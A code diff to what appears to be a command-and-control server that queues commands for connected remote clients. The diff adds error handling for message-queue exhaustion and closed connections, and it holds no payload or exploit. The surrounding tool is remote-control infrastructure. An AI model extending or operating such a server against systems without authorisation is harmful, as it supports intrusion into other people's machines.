@@ -74,7 +74,19 @@ class C2TCPHandler(socketserver.BaseRequestHandler):
         conn_uuid = uuid.uuid4().hex
         conn_folder = base_dir + conn_uuid
         os.mkdir(conn_folder)
-        mq = posix_ipc.MessageQueue(f'/{conn_uuid}', flags=posix_ipc.O_CREAT)
+        try:
+            mq = posix_ipc.MessageQueue(f'/{conn_uuid}', flags=posix_ipc.O_CREAT)
+        except OSError:
+            connectionStorage.start_sync()
+            connectionStorage.connections[conn_uuid] = init_connection(time.time(), self.client_address)
+            connectionStorage.connections[conn_uuid]['is_alive'] = False
+            connectionStorage.end_sync()
+            log_file = conn_folder + hello_log
+            log_handler = open(log_file, 'wb')
+            log_handler.write(b"[*] Connection closed for OS error: too many message queues\n")
+            log_handler.close()
+            self.request.sendall(b'close\n')
+            return
         connectionStorage.start_sync()
         connectionStorage.connections[conn_uuid] = init_connection(time.time(), self.client_address)
         connectionStorage.end_sync()
@@ -103,6 +115,7 @@ class C2TCPHandler(socketserver.BaseRequestHandler):
             log_handler.write(command + b'\n')
             if b'close' in command:
                 close = True
+                mq.close()
             else:
                 n_received, receiving = 0, True
                 original_timeout = self.request.gettimeout()
@@ -179,8 +192,11 @@ def send_c2_command(conn_uuid, command):
     else:
         command = f"{cmd_uuid}{cmd_metadata_separator}{command}"
     mq_name = f'/{conn_uuid}'
-    mq = posix_ipc.MessageQueue(mq_name)
-    mq.send(command)
+    try:
+        mq = posix_ipc.MessageQueue(mq_name)
+        mq.send(command)
+    except posix_ipc.Error:
+        raise NotAliveConnection
     return cmd_uuid
 
 
